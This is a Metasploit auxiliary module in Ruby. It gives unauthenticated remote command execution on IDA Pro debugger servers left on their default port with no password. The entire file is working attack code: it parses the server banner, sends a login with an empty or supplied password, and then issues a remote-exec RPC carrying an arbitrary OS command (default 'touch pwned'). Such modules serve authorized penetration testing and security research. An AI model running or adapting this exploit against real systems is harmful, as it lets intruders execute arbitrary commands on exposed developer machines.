##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp

  RPC_OK = 0
  RPC_OPEN = 3
  RPC_INIT = 10
  RPC_REXEC = 43

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'IDA PRO Debug Server Remote Command Execution',
                      'Description' => %q{
By default the server component of IDA PRO debugger binds to all interfaces and has no password set.
This can be abused for arbitrary command execution.
BTW: even people explictily trying to set a password often get it wrong:
server -Ppasswd  # password set
server -P passwd  # oops, empty password!
                      },
                      'Author' => ['Patrick Harsdorf'],
                      'License' => MSF_LICENSE,
                      'References' =>
                          [
                          ],
                      'DisclosureDate' => ''))

    register_options(
        [
            Opt::RPORT(23946),
            OptString.new('CMD', [false, 'The OS command to execute', '/usr/bin/touch pwned']),
            OptString.new('PASSWORD', [false, 'password', '']),
        ])
  end

  def receive_rpc_packet
    length = sock.recv(4).unpack('N')[0].to_i
    if datastore['VERBOSE']
      print_status("packet length: #{length}")
    end
    rpc_code = sock.recv(1).ord
    data = sock.recv(length)
    if datastore['VERBOSE']
      print_status("Received RPC code: #{rpc_code}, data: #{Rex::Text.hexify(data)}")
    end
    return rpc_code, data
  end

  def send_rpc_packet(rpc_code, data)
    if datastore['VERBOSE']
      print_status("Sending RPC code: #{rpc_code}, data: #{Rex::Text.hexify(data)}")
    end
    rpc_code_str = [rpc_code].pack('c')
    packet = [data.length].pack('N')+rpc_code_str+data
    sock.put(packet)
  end

  def send_and_receive(rpc_code, data)
    send_rpc_packet(rpc_code, data)
    rpc_code, data = receive_rpc_packet
    fail_with(Failure::UnexpectedReply, 'Got response code 0x%X while RPC_OK was expected' % rpc_code) if rpc_code != RPC_OK
    return data
  end

  def run
    connect

    rpc_code, banner = receive_rpc_packet
    fail_with(Failure::UnexpectedReply, 'Got response code 0x%X while RPC_OPEN was expected' % rpc_code) if rpc_code != RPC_OPEN

    version = banner[0].ord
    os_type = case banner[1].ord
                when 0
                  'Windows'
                when 1
                  'Linux'
                else
                  'unknown'
              end
    arch = case banner[2].ord
             when 4
               'x86'
             when 8
               'x64'
             else
               'unknown'
           end
    print_status("Server version 1.#{version},  OS: #{os_type},  Architecture: #{arch}")

    data = send_and_receive(RPC_OK, "\x01#{datastore['PASSWORD']}\x00")
    fail_with(Failure::NoAccess, 'Wrong password') if data[0].ord != 1

    send_and_receive(RPC_INIT, "\xc0\x0c\x00\x01\x00")
    send_and_receive(RPC_REXEC, "#{datastore['CMD']}\x00")
    disconnect
  end
end